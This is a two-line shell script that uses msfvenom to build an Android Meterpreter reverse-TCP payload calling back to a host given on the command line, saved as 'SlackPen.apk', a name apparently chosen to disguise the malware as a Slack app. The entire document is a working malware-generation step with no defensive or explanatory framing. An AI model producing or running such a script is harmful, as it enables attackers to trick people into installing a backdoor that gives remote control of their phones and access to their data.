#!/bin/sh
sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$1 LPORT=4444 R > SlackPen.apk
